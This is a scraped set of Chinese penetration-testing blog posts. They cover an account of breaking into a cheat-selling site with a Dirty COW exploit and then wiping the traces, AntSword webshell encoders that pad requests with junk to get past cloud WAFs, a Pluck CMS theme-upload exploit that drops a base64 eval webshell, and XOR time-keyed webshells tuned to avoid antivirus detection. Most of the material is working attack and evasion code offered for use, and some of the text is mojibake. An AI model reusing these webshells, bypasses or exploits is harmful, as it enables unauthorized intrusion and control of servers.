冷静分析一下，首先脏牛是肯定可以打的，因为内核版本确实在脏牛攻击范围内，并且firefart的exp确实有回显。 因为firefart是直接给你一个加了一个用户，并不会主动返回root权限的shell，需要你su切换或者去登录，猜想可能在覆盖的过程中造成了内核crash就宕机了。 猜想是否可以用直接返回root shell的exp来解决。 explit-db找到了这一个 https://www.exploit-db.com/exploits/40847 编译一下，加个-s参数保存/etc/passwd文件 看到了久违的root ","date":"2019-11-13","objectID":"/posts/hack-pubg-cheat-site-3/:2:3","series":null,"tags":["渗透测试"],"title":"向吃鸡外挂站开炮（三）","uri":"/posts/hack-pubg-cheat-site-3/#曲折的提权"},{"categories":["技术文章"],"content":"\r2.4 拿下宝塔先把他的passwd给恢复回去，不然一会儿机器又崩了就打不开了 找到存有宝塔密码的数据库 /www/server/panel/data/default.db 同目录admin_path.pl下找到面板路径 扔到somd5里解密 成功进入面板 其实进面板的时候怕他绑了微信有提醒，结果没有，哈哈 发现管理员登录IP 查一下地址是福建的 拿到数据库root密码(虽然没啥用) 到此已经拿下服务器所有权限，清除痕迹擦屁股走人。 ","date":"2019-11-13","objectID":"/posts/hack-pubg-cheat-site-3/:2:4","series":null,"tags":["渗透测试"],"title":"向吃鸡外挂站开炮（三）","uri":"/posts/hack-pubg-cheat-site-3/#拿下宝塔"},{"categories":["技术文章"],"content":"\r3 最后有些图是后来补的，如果觉得有说的不对的地方欢迎跟我交流。 法律红线切不可碰，证据全部打包，提交给网警同志。 最后，吐槽一句吃鸡外挂越来越多了，越来越没游戏体验了。 ","date":"2019-11-13","objectID":"/posts/hack-pubg-cheat-site-3/:3:0","series":null,"tags":["渗透测试"],"title":"向吃鸡外挂站开炮（三）","uri":"/posts/hack-pubg-cheat-site-3/#最后"},{"categories":["技术文章"],"content":"\r1 前言模块很早就写好了，今天才有时间把文章写出来 大家都知道填充垃圾数据可以用于SQL注入的绕过，原理就是WAF在遇到大量的GET或者POST参数的时候就会直接把数据直接抛给后端，从而就可以绕过各种各样恶心的过滤。 原因可能是WAF厂商考虑到防止自身程序对于流量分析时间过长，导致用户正常的业务无法访问，所以不得已直接丢给后端。因为咱也没看过WAF内部的规则是怎么写的，所以暂时这样猜想。 同样的，既然都是直接把数据抛给后端，那么这种办法是否可以用于一句话流量的绕过呢，答案当然是可以的，这也是今天写这篇文章的目的。 ","date":"2019-11-09","objectID":"/posts/ant-mass-bypass/:1:0","series":null,"tags":["中国蚁剑","bypass"],"title":"蚁剑编码器之流量混淆","uri":"/posts/ant-mass-bypass/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2019-11-09","objectID":"/posts/ant-mass-bypass/:2:0","series":null,"tags":["中国蚁剑","bypass"],"title":"蚁剑编码器之流量混淆","uri":"/posts/ant-mass-bypass/#正文"},{"categories":["技术文章"],"content":"\r2.1 具体实现在其他例如菜刀，冰蝎这样的管理工具上很难实现，因为扩展性很差。但是强大的蚁剑就可以满足我们的需求。 本来是准备在shell配置信息里加个选项，但是经过考虑还要改蚁剑的结构，不是很方便，所以直接采用了编码器的形式。 这里全部采用了随机的方式来生成垃圾流量，随机变量名长度，随机变量值大小，随机变量个数。 let varname_min = 5; //变量名最小长度 let varname_max = 15; // 变量名最大长度 let data_min = 200; // 变量值最小长度 let data_max = 250; // 变量值最大长度 let num_min = 150; // 变量最小个数 let num_max = 250; // 变量最大个数 function randomString(length) { // 生成随机字符串 //let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let result = ''; for (let i = length; i \u003e 0; --i) result += chars[Math.floor(Math.random() * chars.length)]; return result; } function randomInt(min, max) { //生成指定范围内的随机数 return parseInt(Math.random() * (max - min + 1) + min, 10); } for (let i = 0; i \u003c randomInt(num_min, num_max); i++) { //将混淆流量放入到payload数组中 data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max)); } 那么怎么用呢 很简单，就直接放到普通编码器里就可以了，这里以最基础的也是被各类WAF杀得妈都不认的base64编码器为例 'use strict'; /* code by yzddMr6 */ module.exports = (pwd, data, ext = {}) =\u003e { let varname_min = 5; let varname_max = 15; let data_min = 200; let data_max = 250; let num_min = 100; let num_max = 200; let randomID = `_0x${Math.random().toString(16).substr(2)}`; data[randomID] = Buffer.from(data['_']).toString('base64'); function randomString(length) { //let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let result = ''; for (let i = length; i \u003e 0; --i) result += chars[Math.floor(Math.random() * chars.length)]; return result; } function randomInt(min, max) { return parseInt(Math.random() * (max - min + 1) + min, 10); } for (let i = 0; i \u003c randomInt(num_min, num_max); i++) { data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max)); } data[pwd] = `@eval(base64_decode($_POST[${randomID}]));`; delete data['_']; return data; } ","date":"2019-11-09","objectID":"/posts/ant-mass-bypass/:2:1","series":null,"tags":["中国蚁剑","bypass"],"title":"蚁剑编码器之流量混淆","uri":"/posts/ant-mass-bypass/#具体实现"},{"categories":["技术文章"],"content":"\r2.2 过云锁测试本来想用安全狗，结果发现好像免费版不能拦截一句话。 那就用云锁开刀吧。 首先在虚拟机里放个一句话，就直接用星球里的。 可以正常运行 然后使用蚁剑默认的base64编码器连接试一下 云锁直接drop了数据包，没有返回，在云锁控制端显示受到攻击 然后使用我们上面的流量混淆编码器 shell正常连接，成功bypass云锁。 ","date":"2019-11-09","objectID":"/posts/ant-mass-bypass/:2:2","series":null,"tags":["中国蚁剑","bypass"],"title":"蚁剑编码器之流量混淆","uri":"/posts/ant-mass-bypass/#过云锁测试"},{"categories":["技术文章"],"content":"\r2.3 过阿里云测试这一部分是后来补上的，因为白嫖的阿里云还有一天就到期了。。。 众所周知阿里云是以封IP著名，一言不合就全网ban你，你不仅站日不了了，甚至很多其他网站都打不开。。。 反正要到期了，码也懒得打了。 首先用backdoor study搭建个环境 星球里面随便找一个免杀马放上去，星球里未公开的基本都是过阿里云的。 然后随便找个蚁剑的默认编码器连上去，第一个包还有回显，发第二个包的时候就已经被封IP了 这时候换上加了参数污染后的编码器 正常执行命令 写文件测试 完全bypass ","date":"2019-11-09","objectID":"/posts/ant-mass-bypass/:2:3","series":null,"tags":["中国蚁剑","bypass"],"title":"蚁剑编码器之流量混淆","uri":"/posts/ant-mass-bypass/#过阿里云测试"},{"categories":["技术文章"],"content":"\r3 最后理论上只要是这种云WAF都可以绕过，不管是sql注入也好还是一句话的流量也好，因为通病就是遇到超多处理不了的键值对就会直接扔给后端。 填充垃圾数据不仅仅可以用于php的编码器，所有类型的都可以用，只需要在原来的编码器基础上加上上面那几行神奇的代码，原理都是一样的。 虽然把参数个数改大虽然可以绕过各种waf，但是同样带来一个问题就是响应包会很慢，网络不好的情况下慎用。 若有收获，就点个赞吧 毅宸 今天 11:26 0 0 上一篇 3.0.0.0.1 an-interesting-shell下一篇 3.0.0.0.2 antsword-diy-1回复 输入 Ctrl + / 快速插入卡片 图片 标签 引入 语雀内容 正文 正文标题 1标题 2标题 3标题 4 Ctrl+B粗体 回复 关于语雀使用帮助数据安全服务协议English ","date":"2019-11-09","objectID":"/posts/ant-mass-bypass/:3:0","series":null,"tags":["中国蚁剑","bypass"],"title":"蚁剑编码器之流量混淆","uri":"/posts/ant-mass-bypass/#最后"},{"categories":["技术文章"],"content":"\r3 最后理论上只要是这种云WAF都可以绕过，不管是sql注入也好还是一句话的流量也好，因为通病就是遇到超多处理不了的键值对就会直接扔给后端。 填充垃圾数据不仅仅可以用于php的编码器，所有类型的都可以用，只需要在原来的编码器基础上加上上面那几行神奇的代码，原理都是一样的。 虽然把参数个数改大虽然可以绕过各种waf，但是同样带来一个问题就是响应包会很慢，网络不好的情况下慎用。 若有收获，就点个赞吧 毅宸 今天 11:26 0 0 上一篇 3.0.0.0.1 an-interesting-shell下一篇 3.0.0.0.2 antsword-diy-1回复 输入 Ctrl + / 快速插入卡片 图片 标签 引入 语雀内容 正文 正文标题 1标题 2标题 3标题 4 Ctrl+B粗体 回复 关于语雀使用帮助数据安全服务协议English ","date":"2019-11-09","objectID":"/posts/ant-mass-bypass/:3:0","series":null,"tags":["中国蚁剑","bypass"],"title":"蚁剑编码器之流量混淆","uri":"/posts/ant-mass-bypass/#an-interesting-shell"},{"categories":["技术文章"],"content":"\r3 最后理论上只要是这种云WAF都可以绕过，不管是sql注入也好还是一句话的流量也好，因为通病就是遇到超多处理不了的键值对就会直接扔给后端。 填充垃圾数据不仅仅可以用于php的编码器，所有类型的都可以用，只需要在原来的编码器基础上加上上面那几行神奇的代码，原理都是一样的。 虽然把参数个数改大虽然可以绕过各种waf，但是同样带来一个问题就是响应包会很慢，网络不好的情况下慎用。 若有收获，就点个赞吧 毅宸 今天 11:26 0 0 上一篇 3.0.0.0.1 an-interesting-shell下一篇 3.0.0.0.2 antsword-diy-1回复 输入 Ctrl + / 快速插入卡片 图片 标签 引入 语雀内容 正文 正文标题 1标题 2标题 3标题 4 Ctrl+B粗体 回复 关于语雀使用帮助数据安全服务协议English ","date":"2019-11-09","objectID":"/posts/ant-mass-bypass/:3:0","series":null,"tags":["中国蚁剑","bypass"],"title":"蚁剑编码器之流量混淆","uri":"/posts/ant-mass-bypass/#antsword-diy-1"},{"categories":["技术文章"],"content":"\r1 前言本来是在cnvd上看到了有人发Pluck CMS的洞，但是没有公开细节，便想着自己挖一下。 但是审完第一个后发现已经有两位同学写出来了 Pluck CMS 4.7.10远程代码执行漏洞分析 Pluck CMS 4.7.10 后台 文件包含+文件上传导致getshell代码分析 当时自己的思路跟第一个同学一样，第二个同学的思路自己确实没有想到，佩服佩服。 但是心有不甘，自己就继续挖掘了一下，又发现了两处可以任意命令执行的地方。 ","date":"2019-10-26","objectID":"/posts/pluck-cms-getshell/:1:0","series":null,"tags":["代码审计"],"title":"Pluck CMS后台另两处任意代码执行","uri":"/posts/pluck-cms-getshell/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2019-10-26","objectID":"/posts/pluck-cms-getshell/:2:0","series":null,"tags":["代码审计"],"title":"Pluck CMS后台另两处任意代码执行","uri":"/posts/pluck-cms-getshell/#正文"},{"categories":["技术文章"],"content":"\r2.1 第一处：过滤不严导致单引号逃逸这个跟第一篇思路一样，只不过找到了另一处未过滤的点 在function.php里面blog_save_post()函数 function blog_save_post($title, $category, $content, $current_seoname = null, $force_time = null) { //Check if 'posts' directory exists, if not; create it. if (!is_dir(BLOG_POSTS_DIR)) { mkdir(BLOG_POSTS_DIR); chmod(BLOG_POSTS_DIR, 0777); } //Create seo-filename $seoname = seo_url($title); //Sanitize variables. $title = sanitize($title, true); $content = sanitizePageContent($content, false); if (!empty($current_seoname)) { $current_filename = blog_get_post_filename($current_seoname); $parts = explode('.', $current_filename); $number = $parts[0]; //Get the post time. include BLOG_POSTS_DIR.'/'.$current_filename; if ($seoname != $current_seoname) { unlink(BLOG_POSTS_DIR.'/'.$current_filename); if (is_dir(BLOG_POSTS_DIR.'/'.$current_seoname)) rename(BLOG_POSTS_DIR.'/'.$current_seoname, BLOG_POSTS_DIR.'/'.$seoname); } } else { $files = read_dir_contents(BLOG_POSTS_DIR, 'files'); //Find the number. if ($files) { $number = count($files); $number++; } else $number = 1; if (empty($force_time)) $post_time = time(); else $post_time = $force_time; } //Save information. $data['post_title'] = $title; $data['post_category'] = $category; $data['post_content'] = $content; $data['post_time'] = $post_time; save_file(BLOG_POSTS_DIR.'/'.$number.'.'.$seoname.'.php', $data); //Return seoname under which post has been saved (to allow for redirect). return $seoname; } 其中 $data['post_title'] = $title; $data['post_category'] = $category; $data['post_content'] = $content; $data['post_time'] = $post_time; $title content åè¢«è¿æ»¤ï¼post_time不可控，$category可控 所以只要把$cont2变成我们的payload即可 ","date":"2019-10-26","objectID":"/posts/pluck-cms-getshell/:2:1","series":null,"tags":["代码审计"],"title":"Pluck CMS后台另两处任意代码执行","uri":"/posts/pluck-cms-getshell/#第一处过滤不严导致单引号逃逸"},{"categories":["技术文章"],"content":"\r2.2 第二处：安装模版+文件包含导致任意命令执行很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。 2.2.1 直接访问失败首先准备一个shell.php里面是我们的phpinfo(); 然后打包成shell.zip，直接上传主题 发现确实上传并且解压成功 但是由于目录下有.htaccess文件，直接把php设置为不可解析，所以无法直接访问 2.2.2 文件包含突破所以就想到需要找一个位置对其进行包含，来达到执行的目的。 首先看到admin.php中关于theme的部分 跟进 data/inc/theme.php，发现调用了get_themes()方法 跟进 functions.all.php，查看get_themes()方法 function get_themes() { $dirs = read_dir_contents('data/themes', 'dirs'); if ($dirs) { natcasesort($dirs); foreach ($dirs as $dir) { if (file_exists('data/themes/'.$dir.'/info.php')) { include_once ('data/themes/'.$dir.'/info.php'); $themes[] = array( 'title' =\u003e $themename, 'dir' =\u003e $dir ); } } return $themes; } else return false; } 发现会遍历data/themes/下所有主题目录，并且包含他的info.php文件 此时info.php可控，就导致了任意代码执行。 2.2.3 利用方法首先准备一个info.php \u003c?php file_put_contents('x.php',base64_decode('PD9waHAgQGV2YWwoJF9HRVRbJ21yNiddKTs/Pg==')); ?\u003e 然后打包压缩成shell.zip 上传安装主题，然后点击回到主题页，此时触发文件包含。 然后根目录下就会生成我们的一句话x.php，密码是mr6 ","date":"2019-10-26","objectID":"/posts/pluck-cms-getshell/:2:2","series":null,"tags":["代码审计"],"title":"Pluck CMS后台另两处任意代码执行","uri":"/posts/pluck-cms-getshell/#第二处安装模版文件包含导致任意命令执行"},{"categories":["技术文章"],"content":"\r2.2 第二处：安装模版+文件包含导致任意命令执行很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。 2.2.1 直接访问失败首先准备一个shell.php里面是我们的phpinfo(); 然后打包成shell.zip，直接上传主题 发现确实上传并且解压成功 但是由于目录下有.htaccess文件，直接把php设置为不可解析，所以无法直接访问 2.2.2 文件包含突破所以就想到需要找一个位置对其进行包含，来达到执行的目的。 首先看到admin.php中关于theme的部分 跟进 data/inc/theme.php，发现调用了get_themes()方法 跟进 functions.all.php，查看get_themes()方法 function get_themes() { $dirs = read_dir_contents('data/themes', 'dirs'); if ($dirs) { natcasesort($dirs); foreach ($dirs as $dir) { if (file_exists('data/themes/'.$dir.'/info.php')) { include_once ('data/themes/'.$dir.'/info.php'); $themes[] = array( 'title' =\u003e $themename, 'dir' =\u003e $dir ); } } return $themes; } else return false; } 发现会遍历data/themes/下所有主题目录，并且包含他的info.php文件 此时info.php可控，就导致了任意代码执行。 2.2.3 利用方法首先准备一个info.php \u003c?php file_put_contents('x.php',base64_decode('PD9waHAgQGV2YWwoJF9HRVRbJ21yNiddKTs/Pg==')); ?\u003e 然后打包压缩成shell.zip 上传安装主题，然后点击回到主题页，此时触发文件包含。 然后根目录下就会生成我们的一句话x.php，密码是mr6 ","date":"2019-10-26","objectID":"/posts/pluck-cms-getshell/:2:2","series":null,"tags":["代码审计"],"title":"Pluck CMS后台另两处任意代码执行","uri":"/posts/pluck-cms-getshell/#直接访问失败"},{"categories":["技术文章"],"content":"\r2.2 第二处：安装模版+文件包含导致任意命令执行很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。 2.2.1 直接访问失败首先准备一个shell.php里面是我们的phpinfo(); 然后打包成shell.zip，直接上传主题 发现确实上传并且解压成功 但是由于目录下有.htaccess文件，直接把php设置为不可解析，所以无法直接访问 2.2.2 文件包含突破所以就想到需要找一个位置对其进行包含，来达到执行的目的。 首先看到admin.php中关于theme的部分 跟进 data/inc/theme.php，发现调用了get_themes()方法 跟进 functions.all.php，查看get_themes()方法 function get_themes() { $dirs = read_dir_contents('data/themes', 'dirs'); if ($dirs) { natcasesort($dirs); foreach ($dirs as $dir) { if (file_exists('data/themes/'.$dir.'/info.php')) { include_once ('data/themes/'.$dir.'/info.php'); $themes[] = array( 'title' =\u003e $themename, 'dir' =\u003e $dir ); } } return $themes; } else return false; } 发现会遍历data/themes/下所有主题目录，并且包含他的info.php文件 此时info.php可控，就导致了任意代码执行。 2.2.3 利用方法首先准备一个info.php \u003c?php file_put_contents('x.php',base64_decode('PD9waHAgQGV2YWwoJF9HRVRbJ21yNiddKTs/Pg==')); ?\u003e 然后打包压缩成shell.zip 上传安装主题，然后点击回到主题页，此时触发文件包含。 然后根目录下就会生成我们的一句话x.php，密码是mr6 ","date":"2019-10-26","objectID":"/posts/pluck-cms-getshell/:2:2","series":null,"tags":["代码审计"],"title":"Pluck CMS后台另两处任意代码执行","uri":"/posts/pluck-cms-getshell/#文件包含突破"},{"categories":["技术文章"],"content":"\r2.2 第二处：安装模版+文件包含导致任意命令执行很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。 2.2.1 直接访问失败首先准备一个shell.php里面是我们的phpinfo(); 然后打包成shell.zip，直接上传主题 发现确实上传并且解压成功 但是由于目录下有.htaccess文件，直接把php设置为不可解析，所以无法直接访问 2.2.2 文件包含突破所以就想到需要找一个位置对其进行包含，来达到执行的目的。 首先看到admin.php中关于theme的部分 跟进 data/inc/theme.php，发现调用了get_themes()方法 跟进 functions.all.php，查看get_themes()方法 function get_themes() { $dirs = read_dir_contents('data/themes', 'dirs'); if ($dirs) { natcasesort($dirs); foreach ($dirs as $dir) { if (file_exists('data/themes/'.$dir.'/info.php')) { include_once ('data/themes/'.$dir.'/info.php'); $themes[] = array( 'title' =\u003e $themename, 'dir' =\u003e $dir ); } } return $themes; } else return false; } 发现会遍历data/themes/下所有主题目录，并且包含他的info.php文件 此时info.php可控，就导致了任意代码执行。 2.2.3 利用方法首先准备一个info.php \u003c?php file_put_contents('x.php',base64_decode('PD9waHAgQGV2YWwoJF9HRVRbJ21yNiddKTs/Pg==')); ?\u003e 然后打包压缩成shell.zip 上传安装主题，然后点击回到主题页，此时触发文件包含。 然后根目录下就会生成我们的一句话x.php，密码是mr6 ","date":"2019-10-26","objectID":"/posts/pluck-cms-getshell/:2:2","series":null,"tags":["代码审计"],"title":"Pluck CMS后台另两处任意代码执行","uri":"/posts/pluck-cms-getshell/#利用方法"},{"categories":["技术文章"],"content":"\r3 最后本人水平有限，文笔较差，如果有什么写的不对的地方还希望大家能够不吝赐教 ","date":"2019-10-26","objectID":"/posts/pluck-cms-getshell/:3:0","series":null,"tags":["代码审计"],"title":"Pluck CMS后台另两处任意代码执行","uri":"/posts/pluck-cms-getshell/#最后"},{"categories":["技术文章"],"content":"\r1 前言最近研究了一下蚁剑PHP的RSA和AES编码器，发现都是需要开启openssl扩展才可以使用 但是这个模块大多数情况下是不开的，所以就导致蚁剑的强加密类型的编码器、解码器无法使用 于是借鉴了一下冰蝎的思路，实现了一个动态秘钥的编码器解码器。 ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:1:0","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#前言"},{"categories":["技术文章"],"content":"\r2 冰蝎的解决方案我记得冰蝎在1.0版本有同样的问题，模块不开shell就用不了，但是2.0就解决了这个问题。 那么冰蝎是怎么解决的呢。 看一下他的shell.php是怎么写的 \u003c?php @error_reporting(0); session_start(); if (isset($_GET['pass'])) { $key=substr(md5(uniqid(rand())),16); $_SESSION['k']=$key; print $key; } else { $key=$_SESSION['k']; $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i\u003cstrlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1\u002615]; } } else { $post=openssl_decrypt($post, \"AES128\", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __construct($p) {eval($p.\"\");}} @new C($params); } ?\u003e 注意看这一段 if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i\u003cstrlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1\u002615]; } } else xxxxxx 如果没有openssl扩展，那么就把postçåå®¹è·éæºç§é¥key异或一遍 相当于自己写了个加密函数。 那么当然蚁剑也可以利用此思路来解决此问题。 ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:2:0","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#冰蝎的解决方案"},{"categories":["技术文章"],"content":"\r3 如何生成随机秘钥冰蝎的做法是先请求两次shell(因为第二次请求的时候才会将秘钥保存到session中) 如果请求中有pass=xxx就返回一个十六位的随机秘钥 然后客户端跟服务端分别记下这个秘钥，用于后面流量的加密解密。 但是也带来一个问题，握手获得秘钥的过程已经成为了很多WAF检测的特征。 冰蝎动态二进制加密WebShell特征分析 ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:3:0","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#如何生成随机秘钥"},{"categories":["技术文章"],"content":"\r3.1 如何规避特征当然我们可以用PHPSESSID来作为秘钥，蚁剑的AES编码器也是这么做的。 但是因为蚁剑的机制里面没有自动获取cookie这一个操作 所以需要你人工浏览网站-\u003e获取cookie-\u003e填入配置文件才可以使用，但是太过麻烦。 那么我们能否设置一个不需要握手，并且很容易就可以获得的随机秘钥呢 于是想到可以我们可以用时间 ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:3:1","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#如何规避特征"},{"categories":["技术文章"],"content":"\r3.2 时间格式的选择时间也有很多种格式，选择哪一种呢？ 想到如果时间中带有秒的话，很容易发个包过去就错过同一时间了，无法完成加解密。 所以我们可以采用年-月-日 时-分的时间格式，然后md5一次，来作为我们的随机秘钥。 ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:3:2","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#时间格式的选择"},{"categories":["技术文章"],"content":"\r4 思路与实现蚁剑获取时间-\u003e生成随机秘钥-\u003e加密payload-\u003e发送给shell shell获取时间-\u003e生成随机秘钥-\u003e解密payload-\u003e将回显data编码-\u003e返回给蚁剑 蚁剑获取时间-\u003e生成随机秘钥-\u003e解密返回data-\u003e获取信息 要注意的是因为基于时间产生秘钥，所以要保证你的时区是跟shell的时区是一致的。 因为我本地蚁剑是北京时间，所以在shell中也强制设置为北京时间。 ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:4:0","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#思路与实现"},{"categories":["技术文章"],"content":"\r4.1 动态秘钥编码器不得不说一个坑 同样一句console.log(new Date().toLocaleString()); 在node中是24小时制 在浏览器跟蚁剑中是12小时制 被坑了好久没发现。。。 干脆重新确定一个24小时制的规范时间格式，也方便后期自定义修改 Object.assign(Date.prototype, { switch (time) { let date = { \"yy\": this.getFullYear(), \"MM\": this.getMonth() + 1, \"dd\": this.getDate(), \"hh\": this.getHours(), \"mm\": this.getMinutes(), \"ss\": this.getSeconds() }; if (/(y+)/i.test(time)) { time = time.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length)); } Object.keys(date).forEach(function (i) { if (new RegExp(\"(\" + i + \")\").test(time)) { if (RegExp.$1.length == 2) { date[i] \u003c 10 ? date[i] = '0' + date[i] : date[i]; } time = time.replace(RegExp.$1, date[i]); } }) return time; } }) let newDate = new Date(); let time = newDate.switch('yyyy-MM-dd hh:mm'); 所以demo是这样的 'use strict'; // code by yzddmr6 /* * @param {String} pwd 连接密码 * @param {Array} data 编码器处理前的 payload 数组 * @return {Array} data 编码器处理后的 payload 数组 */ module.exports = (pwd, data, ext={}) =\u003e { function xor(payload){ let crypto = require('crypto'); Object.assign(Date.prototype, { switch (time) { let date = { \"yy\": this.getFullYear(), \"MM\": this.getMonth() + 1, \"dd\": this.getDate(), \"hh\": this.getHours(), \"mm\": this.getMinutes(), \"ss\": this.getSeconds() }; if (/(y+)/i.test(time)) { time = time.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length)); } Object.keys(date).forEach(function (i) { if (new RegExp(\"(\" + i + \")\").test(time)) { if (RegExp.$1.length == 2) { date[i] \u003c 10 ? date[i] = '0' + date[i] : date[i]; } time = time.replace(RegExp.$1, date[i]); } }) return time; } }) let newDate = new Date(); let time = newDate.switch('yyyy-MM-dd hh:mm'); let key = crypto.createHash('md5').update(time).digest('hex') key=key.split(\"\").map(t =\u003e t.charCodeAt(0)); //let payload=\"phpinfo();\"; let cipher = payload.split(\"\").map(t =\u003e t.charCodeAt(0)); for(let i=0;i\u003ccipher.length;i++){ cipher[i]=cipher[i]^key[i%32] } cipher=cipher.map(t=\u003eString.fromCharCode(t)).join(\"\") cipher=Buffer.from(cipher).toString('base64'); //console.log(cipher) return cipher; } data['_'] = Buffer.from(data['_']).toString('base64'); data[pwd] = `eval(base64_decode(\"${data['_']}\"));`; data[pwd]=xor(data[pwd]); delete data['_']; return data; } ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:4:1","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#动态秘钥编码器"},{"categories":["技术文章"],"content":"\r4.2 动态秘钥解码器 'use strict'; //code by yzddmr6 module.exports = { /** * @returns {string} asenc 将返回数据base64编码 * 自定义输出函数名称必须为 asenc * 该函数使用的语法需要和shell保持一致 */ asoutput: () =\u003e { return `function asenc($out){ date_default_timezone_set(\"PRC\"); $key=md5(date(\"Y-m-d H:i\",time())); for($i=0;$i\u003cstrlen($out);$i++){ $out[$i] = $out[$i] ^ $key[$i%32]; } return @base64_encode($out); } `.replace(/\\n\\s+/g, ''); }, /** * 解码 Buffer * @param {string} data 要被解码的 Buffer * @returns {string} 解码后的 Buffer */ decode_buff: (data, ext={}) =\u003e { function xor(payload){ let crypto = require('crypto'); Object.assign(Date.prototype, { switch (time) { let date = { \"yy\": this.getFullYear(), \"MM\": this.getMonth() + 1, \"dd\": this.getDate(), \"hh\": this.getHours(), \"mm\": this.getMinutes(), \"ss\": this.getSeconds() }; if (/(y+)/i.test(time)) { time = time.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length)); } Object.keys(date).forEach(function (i) { if (new RegExp(\"(\" + i + \")\").test(time)) { if (RegExp.$1.length == 2) { date[i] \u003c 10 ? date[i] = '0' + date[i] : date[i]; } time = time.replace(RegExp.$1, date[i]); } }) return time; } }) let newDate = new Date(); let time = newDate.switch('yyyy-MM-dd hh:mm'); let key = crypto.createHash('md5').update(time).digest('hex') key = key.split(\"\").map(t =\u003e t.charCodeAt(0)); let data = payload; let cipher=Buffer.from(data.toString(), 'base64').toString(); cipher = cipher.split(\"\").map(t =\u003e t.charCodeAt(0)); for (let i = 0; i \u003c cipher.length; i++) { cipher[i] = cipher[i] ^ key[i % 32] } cipher=cipher.map(t=\u003eString.fromCharCode(t)).join(\"\") return cipher; } return xor(data); } } 但是发现遇到中文会乱码，所以仅作为一个参考吧 ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:4:2","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#动态秘钥解码器"},{"categories":["技术文章"],"content":"\r4.3 服务端原型 \u003c?php date_default_timezone_set(\"PRC\"); @$post=base64_decode($_REQUEST['yzddmr6']); $key=md5(date(\"Y-m-d H:i\",time())); for($i=0;$i\u003cstrlen($post);$i++){ $post[$i] = $post[$i] ^ $key[$i%32]; } eval($post); ?\u003e D盾4级，稍微处理一下让他免杀 \u003c?php date_default_timezone_set(\"PRC\"); $key=md5(date(\"Y-m-d H:i\",time())); class TEST{ function encode($key){ @$post=base64_decode($_REQUEST['test']); for($i=0;$i\u003cstrlen($post);$i++){$post[$i] = $post[$i] ^ $key[$i%32];} return $post;} function ant($data) {return eval($this-\u003eencode(\"$data\"));} } $test=new TEST; $test-\u003eant($key); ?\u003e ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:4:3","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#服务端"},{"categories":["技术文章"],"content":"\r5 测试在蚁剑中新建编码器 解码器，然后起一个你喜欢的名字，把上面的代码复制进去即可。 配置一下就可以使用啦 没错，我用的就是著名的backdoorstudy 你可以同时使用动态秘钥编码器跟动态秘钥解码器，也可以只使用编码器，或者动态编码器跟其他解码器结合。 要注意的是，因为一些玄学问题，当你使用了demo中的动态解码器后遇见中文会乱码。 个人建议 动态秘钥编码器+base64解码器 就差不多了。 ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:5:0","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#测试"},{"categories":["技术文章"],"content":"\r6 最后在demo中用的是年-月-日 时-分的时间格式，可能过不了多久也会被检测。 如果以后被加入豪华午餐的话，自己可以自由修改日期的格式，例如日-年-月 时-分，或者 日期+盐 来达到混淆的效果 在编码器中已经留好了日期格式修改的接口，换一换顺序即可。 通过以上操作我们已经实现了无需握手传递秘钥的编码器解码器 到这里好像没什么问题了 但是发现蚁剑默认的payload会把data[]数组中其他的参数只是base64一遍 